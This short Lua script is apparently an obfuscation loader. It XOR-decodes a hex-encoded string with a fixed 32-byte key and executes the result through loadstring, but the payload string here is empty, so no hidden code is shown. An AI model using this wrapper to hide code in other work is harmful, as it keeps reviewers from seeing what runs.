local k={26,31,90,43,118,23,120,221,13,212,61,220,213,97,157,117,38,219,60,110,98,83,123,113,36,200,116,32,153,188,168,20}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
